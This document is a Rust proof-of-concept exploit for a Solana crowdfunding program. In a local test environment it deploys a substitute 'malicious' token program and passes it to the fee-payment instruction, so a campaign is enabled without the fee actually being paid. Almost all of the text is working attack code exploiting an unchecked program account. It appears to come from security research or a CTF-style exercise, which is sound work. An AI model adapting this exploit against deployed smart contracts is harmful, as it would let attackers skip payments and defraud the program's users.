use crowdfund::{state::CampaignAccount, instruction::ix_pay_enable_fee};
use solana_program::{
    pubkey::{PubkeyError, Pubkey},
    system_program,
};

use std::{env, str::FromStr};

use poc_framework::{
    spl_associated_token_account::get_associated_token_address, 
    keypair,
    solana_sdk::signer::Signer,
    Environment,
    LocalEnvironment,
    PrintableTransaction,
    borsh::BorshSerialize,
};

pub fn main() {

    // create a path to the farm program 
    let mut dir = env::current_exe().unwrap();
    let path = {
        dir.pop();
        dir.pop();
        dir.push("deploy");
        dir.push("crowdfund.so");
        dir.to_str()
    }
    .unwrap();

    // Create a path to the Proof Of Concept program
    let mut dir2poc = env::current_exe().unwrap();
    let path2poc = {
        dir2poc.pop();
        dir2poc.pop();
        dir2poc.push("deploy");
        dir2poc.push("poc_program.so");
        dir2poc.to_str()
    }
    .unwrap();

    // define amounts we will need during the way for convenience
    let fee_amount: u64 = 5_000_000_000;
    let initial_balance: u64 = 10_000_000_000;

    // Create accounts 
    // 1. 'farm PID'
    let fund_program_id = Pubkey::from_str("FundPid333333333333333333333333333333333333").unwrap();
    
    // 2. 'farm account'. This is a farm state holder
    let fund_account = keypair(0);

    // 3. 'PDA'. Derived from 'farm program ID', 'farm account' and the nonce from the 'farm account'
    let fund_authority = authority_id(&fund_program_id, &fund_account.pubkey(), 101).unwrap();

    // 4. 'creator account'
    let creator = keypair(10);

    // 5. 'Token PID'
    // let token_program_id = spl_token::id();

    // 5a. 'USDC'
    let usdc_token_mint = keypair(192).pubkey();
    
    // 6. 'fee vault' ATA derived from 'PDA' and 'Token PID' ('spl_token TknAccount' associated with the 'farm_authority' wallet)
    let fee_vault = get_associated_token_address(&fund_authority, &usdc_token_mint);

    // 7. 'creator ATA' derived from 'creator account' and 'Token PID' ('spl_token TknAccount' associated with the 'creator' wallet)
    let creator_token_account = get_associated_token_address(&creator.pubkey(), &usdc_token_mint);

    // create a farm data 
    let farm_data = CampaignAccount {
        enabled: 0,
        nonce: 101,
        goal_amount: 100_000_000_000,
        creator: creator.pubkey(),
    };

    // serialize the data 
    let mut writer_data: Vec<u8> = vec![];
    farm_data.serialize(&mut writer_data).unwrap();

    // build the initial environment
    let mut env = LocalEnvironment::builder()

        // deploy the Farm Program
        .add_program(fund_program_id, path)

        // register 'creator account'
        .add_account_with_lamports(
            creator.pubkey(),
            system_program::ID,
            initial_balance,
        )

        // register 'farm account' and populate it with the data
        .add_account_with_data(
            fund_account.pubkey(), 
            fund_program_id, 
            writer_data.as_mut(), 
            false
        )

        // register 'creator ATA'
        .add_associated_account_with_tokens(
            creator.pubkey(), 
            usdc_token_mint,    
            initial_balance
        )

        // register 'PDA ATA' --- fee_vault
        .add_associated_account_with_tokens(
            fund_authority, 
            usdc_token_mint, 
            initial_balance
        )
        .build();

    // Deploy the POC program. Save the PubKey to the variable
    let forked_token_program = env.deploy_program(path2poc);
    
    // Send the prepared transaction using the helper function from the Farm program 
    let tx_create = env.execute_as_transaction(&[ix_pay_enable_fee(
        &fund_account.pubkey(),
        &fund_authority,
        &creator.pubkey(),
        &creator_token_account,
        &fee_vault,
        &forked_token_program,
        &fund_program_id,
        fee_amount,
        )], 
        &[&creator],
    );

    // observe the malicious Proof od Concept program is invoked
    tx_create.print_named("Proof Of Concept");
    println!("{:?}", tx_create.transaction.meta.unwrap());
    println!("The Proof of concept was invoked. And the farm (without paying the fee) was enabled");
}

// Create PDA function
pub fn authority_id(
    program_id: &Pubkey,
    my_info: &Pubkey,
    nonce: u8,
) -> Result<Pubkey, PubkeyError> {
    Pubkey::create_program_address(&[&my_info.to_bytes()[..32], &[nonce]], program_id)
}